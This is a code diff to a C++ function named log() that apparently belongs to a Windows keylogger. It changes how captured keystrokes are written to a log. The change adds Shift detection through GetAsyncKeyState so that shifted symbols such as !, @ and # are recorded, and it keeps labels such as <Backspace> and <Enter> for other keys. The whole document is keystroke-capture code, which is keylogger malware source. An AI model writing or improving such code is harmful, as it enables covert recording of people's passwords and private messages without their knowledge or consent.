@@ -50,32 +50,99 @@ void log()
 
 				else
 				{
-					switch(c)
+					if(GetAsyncKeyState(0x10) != 0)
 					{
-						case 49:
-							if(GetAsyncKeyState(0x10) != 0)
+						switch(c)
+						{
+							case 49:
 							{
 								write << "!";
 							}
-							else
+							break;
+							case 50:
 							{
-								write << "1";
+								write << "@";
 							}
 							break;
-						case 8: write << "<Backspace>";
+							case 51:
+							{
+								write << "#";
+							}
 							break;
-						case 9: write << "<TAB>";
+							case 52:
+							{
+								write << "$";
+							}
 							break;
-						case 27: write << "<ESC>";
+							case 53:
+							{
+								write << "%";
+							}
 							break;
-						case 127: write << "<DEL>";
+							case 54:
+							{
+								write << "^";
+							}
 							break;
-						case 32: write << " ";
+							case 55:
+							{
+								write << "&";
+							}
 							break;
-						case 13: write << "<Enter>\n";
+							case 56:
+							{
+								write << "*";
+							}
 							break;
-						default: write << c;
+							case 57:
+							{
+								write << "(";
+							}
+							break;
+							case 48:
+							{
+								write << ")";
+							}
+							break;
+							case 45:
+							{
+								write << "_";
+							}
+							break;
+							case 61:
+							{
+								write << "+";
+							}
+							break;
+							case 47:
+							{
+								write << "?";
+							}
+							break;
+							default: write << c;
+						}
 					}
+					else
+					{
+						switch(c)
+						{
+
+							case 8: write << "<Backspace>";
+								break;
+							case 9: write << "<TAB>";
+								break;
+							case 27: write << "<ESC>";
+								break;
+							case 127: write << "<DEL>";
+								break;
+							case 32: write << " ";
+								break;
+							case 13: write << "<Enter>\n";
+								break;
+							default: write << c;
+						}
+					}
+
 
 				}
 
